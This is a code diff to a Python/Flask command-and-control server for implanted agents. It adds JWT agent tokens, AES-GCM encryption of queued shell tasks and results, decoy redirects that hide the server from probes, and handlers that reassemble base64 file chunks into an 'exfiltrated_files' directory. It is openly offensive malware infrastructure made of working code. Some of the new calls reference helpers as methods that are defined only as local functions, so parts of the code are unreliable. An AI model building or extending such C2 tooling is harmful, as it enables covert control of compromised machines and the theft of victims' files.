@@ -38,8 +38,10 @@ from __future__ import annotations
 import base64
 import hashlib
 import json
+import jwt
 import logging
 import os
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import queue
 import random
 import re
@@ -532,10 +534,10 @@ class BeaconC2Server:
         return True, "Beacon server stopped"
 
     def execute_command(
-        self, conn_id: str, command: str
+        self, conn_id: str, command: str, task_type: str = "shell_cmd"
     ) -> Tuple[bool, str]:
         """
-        Enqueue a shell command for the specified agent.
+        Enqueue a command for the specified agent.
 
         The agent will receive the task on its next beacon poll.
         """
@@ -547,7 +549,7 @@ class BeaconC2Server:
 
             task = {
                 "task_id":   str(uuid.uuid4())[:8],
-                "type":      "shell_cmd",
+                "type":      task_type,
                 "command":   command,
                 "issued_at": datetime.now().isoformat(),
             }
@@ -1080,8 +1082,36 @@ class BeaconC2Server:
             # Constant-time comparison prevents timing-oracle attacks
             return secrets.compare_digest(incoming_secret, c2._proxy_secret or "")
 
-        def _token_for(conn_id: str) -> str:
-            return c2.active_connections.get(conn_id, {}).get("token", "")
+        def _validate_jwt(token: str, expected_conn_id: str) -> bool:
+            try:
+                payload = jwt.decode(token, flask_app.config["SECRET_KEY"], algorithms=["HS256"])
+                return payload.get("conn_id") == expected_conn_id
+            except jwt.PyJWTError:
+                return False
+
+        def _get_agent_key(secret: str) -> bytes:
+            """Derive a 32-byte AES key from the agent's secret."""
+            return hashlib.sha256(secret.encode()).digest()
+
+        def _encrypt_data(key: bytes, plaintext: str) -> str:
+            """Encrypt using AES-256-GCM."""
+            aesgcm = AESGCM(key)
+            nonce = os.urandom(12)
+            ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
+            return base64.b64encode(nonce + ciphertext).decode()
+
+        def _decrypt_data(key: bytes, b64_payload: str) -> Optional[str]:
+            """Decrypt using AES-256-GCM."""
+            try:
+                data = base64.b64decode(b64_payload)
+                if len(data) < 28: # 12 nonce + 16 tag + min 0 ciphertext
+                    return None
+                nonce = data[:12]
+                ciphertext = data[12:]
+                aesgcm = AESGCM(key)
+                return aesgcm.decrypt(nonce, ciphertext, None).decode()
+            except Exception:
+                return None
 
         # ── individual business-logic handlers ──────────────────────
 
@@ -1105,9 +1135,15 @@ class BeaconC2Server:
 
             conn_id = str(uuid.uuid4())[:12]
             secret  = secrets.token_hex(16)
-            token   = hashlib.sha256(
-                (conn_id + secret).encode()
-            ).hexdigest()[:32]
+            import datetime as _dt
+            token = jwt.encode(
+                {
+                    "conn_id": conn_id,
+                    "exp": _dt.datetime.utcnow() + _dt.timedelta(days=7)
+                },
+                flask_app.config["SECRET_KEY"],
+                algorithm="HS256"
+            )
 
             with c2._lock:
                 c2.active_connections[conn_id] = {
@@ -1146,7 +1182,7 @@ class BeaconC2Server:
 
             with c2._lock:
                 info = c2.active_connections.get(conn_id)
-                if not info or info["token"] != token:
+                if not info or not _validate_jwt(token, conn_id):
                     # Looks like a real 404 — nothing suspicious
                     return redirect(prof["decoy_redirect"], 302)
                 info["last_activity"] = datetime.now()
@@ -1161,10 +1197,15 @@ class BeaconC2Server:
 
             if task:
                 c2.logger.info(
-                    "Task dispatched to %s: [%s] %r",
+                    "Task dispatched to %s: [%s] %r (ENCRYPTED)",
                     conn_id, task.get("task_id"), task.get("command"),
                 )
-                return jsonify(task), 200
+                
+                # Encrypt the entire task JSON for Tier 4 security
+                key = c2._get_agent_key(info["secret"])
+                encrypted_task = c2._encrypt_data(key, json.dumps(task))
+                return jsonify({"enc": encrypted_task}), 200
+            
             return ("", 204)   # idle — agent jitters and retries
 
         def _handle_result(prof: Dict[str, Any]):
@@ -1172,12 +1213,23 @@ class BeaconC2Server:
             data    = request.get_json(silent=True) or {}
             conn_id = data.get("aid", "")
             token   = data.get("token", "")
+            enc_payload = data.get("enc", "")
 
             with c2._lock:
                 info = c2.active_connections.get(conn_id)
-                if not info or info["token"] != token:
+                if not info or not _validate_jwt(token, conn_id):
                     return redirect(prof["decoy_redirect"], 302)
+                
                 info["last_activity"] = datetime.now()
+
+                # Decrypt the result if it's encrypted (Tier 4)
+                if enc_payload:
+                    key = c2._get_agent_key(info["secret"])
+                    decrypted = c2._decrypt_data(key, enc_payload)
+                    if not decrypted:
+                        c2.logger.error("Failed to decrypt result from %s", conn_id)
+                        return jsonify({"status": "error", "msg": "decryption failed"}), 400
+                    data = json.loads(decrypted)
 
                 entry = {
                     "task_id":     data.get("task_id", ""),
@@ -1185,6 +1237,70 @@ class BeaconC2Server:
                     "output":      data.get("output", ""),
                     "received_at": datetime.now().isoformat(),
                 }
+
+                # Handle Chunked Data Exfiltration (Tier 5)
+                if entry["output"].startswith("CHUNK:"):
+                    try:
+                        b64_chunk = entry["output"].split(":", 1)[1]
+                        raw_chunk = base64.b64decode(b64_chunk)
+                        task_id = entry["task_id"]
+                        
+                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
+                        os.makedirs(exfil_dir, exist_ok=True)
+                        
+                        # Use task_id to group chunks into a temporary file
+                        temp_path = os.path.join(exfil_dir, f"partial_{task_id}.tmp")
+                        with open(temp_path, "ab") as f:
+                            f.write(raw_chunk)
+                        
+                        return jsonify({"status": "ok"}), 200
+                    except Exception as e:
+                        c2.logger.error(f"Chunk assembly error from {conn_id}: {e}")
+                        return jsonify({"status": "error"}), 500
+
+                elif entry["output"] == "EOF":
+                    try:
+                        task_id = entry["task_id"]
+                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
+                        temp_path = os.path.join(exfil_dir, f"partial_{task_id}.tmp")
+                        
+                        if os.path.exists(temp_path):
+                            orig_path = entry["command"]
+                            base_name = os.path.basename(orig_path) if orig_path else "unknown"
+                            filename = f"{int(time.time())}_{base_name}"
+                            final_path = os.path.join(exfil_dir, filename)
+                            
+                            os.rename(temp_path, final_path)
+                            entry["output"] = f"[EXFIL] Chunked transfer complete. Saved {os.path.getsize(final_path)} bytes to: {final_path}"
+                            c2.logger.info(f"Chunked exfiltration complete from {conn_id}: {final_path}")
+                        else:
+                            entry["output"] = "[EXFIL ERROR] EOF received but no partial file found."
+                    except Exception as e:
+                        entry["output"] = f"[EXFIL ERROR] Finalization failed: {str(e)}"
+                        c2.logger.error(f"Exfiltration finalization error: {e}")
+
+                # Handle Legacy Legacy Full-File Exfiltration (FILE_DATA: prefix)
+                elif entry["output"].startswith("FILE_DATA:"):
+                    try:
+                        b64_data = entry["output"].split(":", 1)[1]
+                        raw_data = base64.b64decode(b64_data)
+                        
+                        exfil_dir = os.path.join(os.getcwd(), "exfiltrated_files", conn_id)
+                        os.makedirs(exfil_dir, exist_ok=True)
+                        
+                        orig_path = entry["command"]
+                        base_name = os.path.basename(orig_path) if orig_path else "unknown"
+                        filename = f"{int(time.time())}_{base_name}"
+                        save_path = os.path.join(exfil_dir, filename)
+                        
+                        with open(save_path, "wb") as f:
+                            f.write(raw_data)
+                        
+                        entry["output"] = f"[EXFIL] Successfully saved {len(raw_data)} bytes to: {save_path}"
+                        c2.logger.info(f"File exfiltrated from {conn_id}: {save_path}")
+                    except Exception as e:
+                        entry["output"] = f"[EXFIL ERROR] Failed to save exfiltrated file: {str(e)}"
+
                 store = c2._result_store.setdefault(conn_id, [])
                 store.append(entry)
                 if len(store) > MAX_CMD_RESULTS:
@@ -1204,7 +1320,7 @@ class BeaconC2Server:
 
             with c2._lock:
                 info = c2.active_connections.get(conn_id)
-                if not info or info["token"] != token:
+                if not info or not _validate_jwt(token, conn_id):
                     return redirect(prof["decoy_redirect"], 302)
                 info["last_activity"] = datetime.now()
 
